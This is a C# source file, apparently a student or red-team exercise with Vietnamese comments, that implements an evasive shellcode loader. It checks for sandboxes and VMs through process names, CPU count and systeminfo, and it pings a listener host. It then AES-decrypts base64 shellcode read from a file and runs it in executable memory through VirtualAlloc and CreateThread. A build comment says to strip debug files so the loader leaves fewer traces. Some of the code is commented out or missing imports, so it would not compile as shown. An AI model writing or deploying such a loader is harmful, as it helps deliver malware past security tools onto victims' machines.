// Project --> Properties --> Build --> Advanced --> chỉnh debug info thành None để loại bỏ file .pdb

/* C:\Windows\Microsoft.NET\Framework64\v4.0.30319> csc.exe /unsafe /out:step1.exe C:\Users\User\source\repos\task2-1\task2-1\Program.cs
https://github.com/Ormicron/csharp-ShellcodeLoader */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.NetworkInformation;

namespace Test_Task2
{
    class Program
    {
        static void Main(string[] args)
        {

            if (IsRunningInSandbox() || CheckCPUCount() < 2 || !IsNetworkAvaiable())
            {
                Console.WriteLine("It's look like a sandbox or VM. Exiting...");
                return;
            }
            string serverIP = "192.168.135.5";
            if (PingServer(serverIP))
            {
                Console.WriteLine("ICMP ping successful to " + serverIP);
            }
            else
            {
                Console.WriteLine("Failed to reach " + serverIP + ". Exiting...");
                return;
            }
            if (args.Length == 0)
            {
                Console.WriteLine("The Path cannot be empty");
                Environment.Exit(0);
            }
            if (!File.Exists(args[0]))
            {
                Console.WriteLine("FIle Not Exists.");
                Environment.Exit(0);
            }

            using (StreamReader fileSR = new StreamReader(args[0]))
            {
                String line = null;
                String data = null;

                while ((line = fileSR.ReadLine()) != null)
                {
                    data += line;
                }
                fileSR.Close();
                String secret = data.Split(':')[0];
                byte[] Key = System.Text.Encoding.UTF8.GetBytes(data.Split(':')[1]);
                byte[] Iv = System.Text.Encoding.UTF8.GetBytes(data.Split(':')[2]);
                String resultDecrypt = DecryptAesTo_String(secret, Key, Iv);

                byte[] wzqadgmywan = Convert.FromBase64String(resultDecrypt);
                // File.Delete(args[0]);
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)wzqadgmywan.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(wzqadgmywan, 0, (IntPtr)(funcAddr), wzqadgmywan.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfao = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfao, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            /*
                for (int i = 0; i < args.Length; i++)
                {
                    Console.WriteLine(args[i]);
                    Console.ReadKey();
                }
            */
        }
        static String DecryptAesTo_String(String cipherTextBase, byte[] Key, byte[] Iv)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextBase);

            String plaintext = null;
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = Iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }
        // Count CPU - Detect virtualiaze/sandbox
        private static int CheckCPUCount()
        {
            return Environment.ProcessorCount;
        }
        // Check network
        private static bool IsNetworkAvaiable()
        {
            return NetworkInterface.GetIsNetworkAvailable();
        }
        /*
        private static bool IsRunningInSandbox()
        {
            // Check name
            string machineName = Environment.MachineName;
            if (machineName.Contains("VM") || machineName.Contains("sandbox"))
            {
                return true;
            }
            return false; // Not detect sandbox
        } 
// Check tiến trình nếu phát hiện có những tên được liệt kê sẽ ngừng shell
                private static bool IsRunningInSandbox()
        {
            // Một số phần mềm sandbox thường có tên gọi cụ thể trong tiến trình
            string[] sandboxProcesses = { "vmsrvc", "tcpview", "wireshark", "virtualbox", "sandboxie", "sbiectrl" };
            foreach (string process in sandboxProcesses)
            {
                if (Process.GetProcessesByName(process).Length > 0)
                {
                    return true;
                }
            }
            return false;
        }
        
        // Ping server listener
        static bool PingServer(string ipAddress)
        {
            try
            {
                Ping pingSender = new Ping();
                PingReply reply = pingSender.Send(ipAddress);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        } */

        // Dùng lệnh systeminfo để check dòng System Model
        private static bool IsSystemVirtualized()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c systeminfo")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                // Split the output into lines and find the one with "System Model"
                string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                string systemModelLine = lines.FirstOrDefault(line => line.StartsWith("System Model", StringComparison.OrdinalIgnoreCase));

                if (systemModelLine != null &&
                    (systemModelLine.Contains("Virtual") || systemModelLine.Contains("VMware") || systemModelLine.Contains("VirtualBox") || systemModelLine.Contains("Hyper-V")))
                {
                    return true; // Detected virtual environment
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error checking system info: " + ex.Message);
            }
            return false; // Not virtualized
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(
        string moduleName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(
        IntPtr hModule,
        string procName
        );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(
        string lpFileName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
    }
}
